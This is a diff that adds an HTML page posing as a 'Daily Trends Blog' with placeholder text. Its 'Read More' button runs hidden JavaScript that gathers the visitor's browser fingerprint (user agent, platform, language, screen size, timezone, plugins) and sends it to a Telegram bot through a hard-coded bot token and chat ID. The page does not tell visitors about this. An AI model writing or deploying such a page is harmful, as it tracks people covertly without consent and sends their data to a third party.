@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Trends Blog</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; }
+    header { background:#333; color:#fff; padding:20px; text-align:center; }
+    main { padding:20px; }
+    article { background:#fff; padding:15px; margin-bottom:20px; border-radius:8px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }
+    button { background:#007bff; color:white; padding:12px 20px; border:none; border-radius:5px; cursor:pointer; font-size:16px; }
+    button:hover { background:#0056b3; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Daily Trends Blog</h1>
+    <p>Stay updated with random thoughts & articles</p>
+  </header>
+
+  <main>
+    <article>
+      <h2>Random Post Title</h2>
+      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec sit amet commodo nisi. Proin ac blandit leo.</p>
+      <button onclick="captureFingerprint()">Read More</button>
+    </article>
+  </main>
+
+  <script>
+    const BOT_TOKEN = "8000159141:AAFRHw5vslXgO6BveXnfYNkZju0cHcsA4Gw";
+    const CHAT_ID = "2081305533";
+
+    async function captureFingerprint() {
+      const fingerprint = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        plugins: Array.from(navigator.plugins).map(p => p.name)
+      };
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: JSON.stringify(fingerprint) })
+      });
+    }
+  </script>
+</body>
+</html>
